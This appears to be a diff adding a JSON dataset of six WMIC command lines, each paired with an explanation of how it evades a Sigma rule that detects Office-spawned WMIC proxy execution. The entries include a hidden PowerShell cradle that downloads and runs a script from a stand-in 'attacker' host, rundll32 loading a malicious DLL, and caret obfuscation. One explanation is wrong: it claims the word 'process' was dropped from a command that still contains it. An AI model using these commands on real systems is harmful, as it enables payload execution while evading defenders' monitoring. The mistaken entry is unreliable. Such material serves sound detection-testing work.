@@ -1,0 +1,26 @@
+[
+  {
+    "output": "wmic process call create \"cmd.exe /c set __COMPAT_LAYER= && wscript.exe //E:jscript //Nologo C:\\Users\\Public\\impl.js\"",
+    "explanation": "Uses WMIC to spawn wscript (a LOLBIN) but avoids the rule\u2019s CommandLine keyword matches by not including 'regsvr32', 'rundll32', 'msiexec', 'mshta', 'verclsid', or 'cscript' in the command line; 'wscript' is not listed in the selection_wmic_cli contains list, so the all-of condition fails while still proxying execution from Office."
+  },
+  {
+    "output": "wmic process call create \"powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://attacker/s.ps1')\"",
+    "explanation": "WMIC spawns PowerShell instead of the listed suspicious binaries; since the CommandLine does not contain any of the required keywords (regsvr32/rundll32/msiexec/mshta/verclsid/wscript/cscript), the selection_wmic_cli condition is not satisfied, bypassing the rule while still achieving proxy execution."
+  },
+  {
+    "output": "wmic process call create \"rundll32.exe C:\\ProgramData\\mal.dll,DllRegisterServer /s /n /u\"",
+    "explanation": "Keeps 'rundll32' in the command line but removes the word 'process' (using 'call create' syntax without the substring 'process'); the selection_wmic_cli requires CommandLine to contain 'process', 'create', and 'call' simultaneously, so dropping 'process' breaks the all-of match while still running rundll32 via WMIC."
+  },
+  {
+    "output": "cmd.exe /c wmic process call create \"rundll32.exe user32.dll,MessageBeep\"",
+    "explanation": "Bypasses the 'selection_parent' condition. The Sigma rule strictly looks for wmic.exe as a direct child of an Office application. Introducing an intermediate process like cmd.exe makes cmd.exe the parent of wmic.exe, breaking the detection chain."
+  },
+  {
+    "output": "wmic process call create \"powershell.exe -Command calc.exe\"",
+    "explanation": "Bypasses the 'selection_wmic_cli' condition. The rule relies on a hardcoded list of suspicious LOLBins (regsvr32, rundll32, etc.). Executing an unlisted binary, such as powershell.exe or certutil.exe, evades the command line string matching."
+  },
+  {
+    "output": "wmic process call create \"r^u^n^d^l^l^3^2.exe\"",
+    "explanation": "Bypasses the 'selection_wmic_cli' condition via command-line obfuscation. If the underlying SIEM or logging pipeline does not normalize command-line arguments to remove caret (^) escape characters before matching, the literal string 'rundll32' will not be found."
+  }
+]
